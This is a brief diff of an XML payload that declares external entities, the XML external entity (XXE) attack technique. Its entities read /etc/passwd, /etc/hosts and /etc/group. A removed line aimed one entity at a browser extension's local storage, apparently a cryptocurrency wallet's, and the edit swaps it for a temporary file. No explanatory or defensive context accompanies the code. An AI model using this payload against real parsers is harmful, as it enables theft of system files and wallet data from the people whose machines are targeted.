@@ -3,7 +3,7 @@
 <!ENTITY passwd SYSTEM "file:///etc/passwd">
 <!ENTITY hosts SYSTEM "file:///etc/hosts">
 <!ENTITY group SYSTEM "file:///etc/group">
-<!ENTITY MM SYSTEM "file:///Users/reborn/Library/Application%20Support/Google/Chrome/Profile%2066/Local%20Extension%20Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/1.txt">
+<!ENTITY MM SYSTEM "file:///tmp/123.txt">
 ]> 
 
 <p>
